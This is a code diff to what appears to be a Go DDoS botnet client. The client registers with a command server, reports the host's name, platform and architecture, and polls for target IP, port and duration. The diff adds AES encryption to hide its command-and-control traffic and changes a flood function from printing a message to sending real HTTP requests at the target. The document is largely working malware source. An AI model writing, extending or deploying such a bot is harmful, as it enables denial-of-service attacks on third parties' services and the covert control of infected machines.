@@ -2,8 +2,14 @@ package main
 
 import (
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
+	"errors"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net/http"
 	"os"
@@ -17,11 +23,91 @@ type Creds struct {
 	Token string `json:"token"`
 }
 
+type Session struct {
+	Key string `json:"key"`
+}
+
 type BootInstructions struct {
 	ID   string `json:"identifier"`
 	Ip   string `json:"ip"`
 	Port string `json:"port"`
 	End  string `json:"endTime"`
+}
+
+func Pad(buf []byte, size int) ([]byte, error) {
+	bufLen := len(buf)
+	padLen := size - bufLen%size
+	padded := make([]byte, bufLen+padLen)
+	copy(padded, buf)
+	for i := 0; i < padLen; i++ {
+		padded[bufLen+i] = byte(padLen)
+	}
+	return padded, nil
+}
+
+func Unpad(padded []byte, size int) ([]byte, error) {
+	if len(padded)%size != 0 {
+		return nil, errors.New("pkcs7: Padded value wasn't in correct size.")
+	}
+
+	bufLen := len(padded) - int(padded[len(padded)-1])
+	buf := make([]byte, bufLen)
+	copy(buf, padded[:bufLen])
+	return buf, nil
+}
+
+func Encrypt(unencrypted string, cipher_key string) (string, error) {
+	key := []byte(cipher_key)
+	plainText := []byte(unencrypted)
+	plainText, err := Pad(plainText, aes.BlockSize)
+	if err != nil {
+		return "", fmt.Errorf(`plainText: "%s" has error`, plainText)
+	}
+	if len(plainText)%aes.BlockSize != 0 {
+		err := fmt.Errorf(`plainText: "%s" has the wrong block size`, plainText)
+		return "", err
+	}
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
+
+	cipherText := make([]byte, aes.BlockSize+len(plainText))
+	iv := cipherText[:aes.BlockSize]
+	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
+		return "", err
+	}
+
+	mode := cipher.NewCBCEncrypter(block, iv)
+	mode.CryptBlocks(cipherText[aes.BlockSize:], plainText)
+
+	return fmt.Sprintf("%x", cipherText), nil
+}
+
+func Decrypt(encrypted string, cipher_key string) (string, error) {
+	key := []byte(cipher_key)
+	cipherText, _ := hex.DecodeString(encrypted)
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		panic(err)
+	}
+
+	if len(cipherText) < aes.BlockSize {
+		panic("cipherText too short")
+	}
+	iv := cipherText[:aes.BlockSize]
+	cipherText = cipherText[aes.BlockSize:]
+	if len(cipherText)%aes.BlockSize != 0 {
+		panic("cipherText is not a multiple of the block size")
+	}
+
+	mode := cipher.NewCBCDecrypter(block, iv)
+	mode.CryptBlocks(cipherText, cipherText)
+
+	cipherText, _ = Unpad(cipherText, aes.BlockSize)
+	return fmt.Sprintf("%s", cipherText), nil
 }
 
 func checkConnection(apiURL string) bool {
@@ -123,15 +209,21 @@ func readFromBootFile(filePath string) string {
 	return result
 }
 
-func updateDetails(apiURL string, id string, token string) {
+func updateDetails(apiURL string, sessionKey string, id string, token string) {
 	var updateURL string = apiURL + "/update/details/" + id + "/" + token
 
 	hostname, _ := os.Hostname()
+	var platform string = runtime.GOOS
+	var arch string = runtime.GOARCH
+
+	encryptedHostname, _ := Encrypt(hostname, sessionKey)
+	encryptedPlatform, _ := Encrypt(platform, sessionKey)
+	encryptedArch, _ := Encrypt(arch, sessionKey)
 
 	requestBody, _ := json.Marshal(map[string]string{
-		"hostname": hostname,
-		"platform": runtime.GOOS,
-		"arch":     runtime.GOARCH,
+		"hostname": encryptedHostname,
+		"platform": encryptedPlatform,
+		"arch":     encryptedArch,
 	})
 
 	resp, err := http.Post(updateURL, "application/json", bytes.NewBuffer(requestBody))
@@ -139,6 +231,27 @@ func updateDetails(apiURL string, id string, token string) {
 	if err == nil {
 		defer resp.Body.Close()
 	}
+}
+
+func getSessionKey(apiURL string, id string, token string) string {
+	var result string
+	var sessionURL = apiURL + "/session/key/" + id + "/" + token
+
+	resp, err := http.Get(sessionURL)
+
+	if err == nil {
+		defer resp.Body.Close()
+
+		if resp.StatusCode == 200 {
+			var decodedJSON Session
+			responseBytes, _ := ioutil.ReadAll(resp.Body)
+
+			json.Unmarshal(responseBytes, &decodedJSON)
+			result = string(decodedJSON.Key)
+		}
+	}
+
+	return result
 }
 
 func checkBoot(apiURL string, id string, token string) bool {
@@ -158,7 +271,7 @@ func checkBoot(apiURL string, id string, token string) bool {
 	return result
 }
 
-func getBootInstructions(apiURL string, id string, token string) []string {
+func getBootInstructions(apiURL string, sessionKey string, id string, token string) []string {
 	var result []string
 	var bootURL string = apiURL + "/boot/" + id + "/" + token
 
@@ -173,21 +286,26 @@ func getBootInstructions(apiURL string, id string, token string) []string {
 
 			json.Unmarshal(responseBytes, &decodedJSON)
 
-			result = append(result, decodedJSON.ID)
-			result = append(result, decodedJSON.Ip)
-			result = append(result, decodedJSON.Port)
-			result = append(result, decodedJSON.End)
+			unencryptedId, _ := Decrypt(decodedJSON.ID, sessionKey)
+			unencryptedIp, _ := Decrypt(decodedJSON.Ip, sessionKey)
+			unencryptedPort, _ := Decrypt(decodedJSON.Port, sessionKey)
+			unencryptedEnd, _ := Decrypt(decodedJSON.End, sessionKey)
+
+			result = append(result, unencryptedId)
+			result = append(result, unencryptedIp)
+			result = append(result, unencryptedPort)
+			result = append(result, unencryptedEnd)
 		}
 	}
 
 	return result
 }
 
-func bootRun(apiURL string, id string, token string, bootFilePath string) {
+func bootRun(apiURL string, sessionKey string, id string, token string, bootFilePath string) {
 	var bootActive bool = checkBoot(apiURL, id, token)
 
 	if bootActive {
-		var bootInstructions []string = getBootInstructions(apiURL, id, token)
+		var bootInstructions []string = getBootInstructions(apiURL, sessionKey, id, token)
 
 		var savedBootID string = readFromBootFile(bootFilePath)
 
@@ -228,7 +346,12 @@ func bootRoutine(id string, token string, endTime time.Time, bootInstructions []
 }
 
 func flood(target string, port string) {
-	fmt.Println("Flooding " + target + ":" + port)
+	resp, _ := http.Get(target + ":" + port)
+	fmt.Println("Sent packet")
+	if resp != nil {
+		io.Copy(ioutil.Discard, resp.Body)
+		resp.Body.Close()
+	}
 }
 
 func main() {
@@ -247,14 +370,17 @@ func main() {
 
 			if credsValidated {
 
-				updateDetails(apiURL, credidentials[0], credidentials[1])
+				var sessionKey string = getSessionKey(apiURL, credidentials[0], credidentials[1])
+
+				updateDetails(apiURL, sessionKey, credidentials[0], credidentials[1])
 
 				for range time.NewTicker(5 * time.Second).C {
-					bootRun(apiURL, credidentials[0], credidentials[1], bootFilePath)
+					sessionKey = getSessionKey(apiURL, credidentials[0], credidentials[1])
+					bootRun(apiURL, sessionKey, credidentials[0], credidentials[1], bootFilePath)
 				}
 
 			} else {
-				var newCredidentials = registerAccount(apiURL)
+				var newCredidentials []string = registerAccount(apiURL)
 				writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
 				main()
 			}
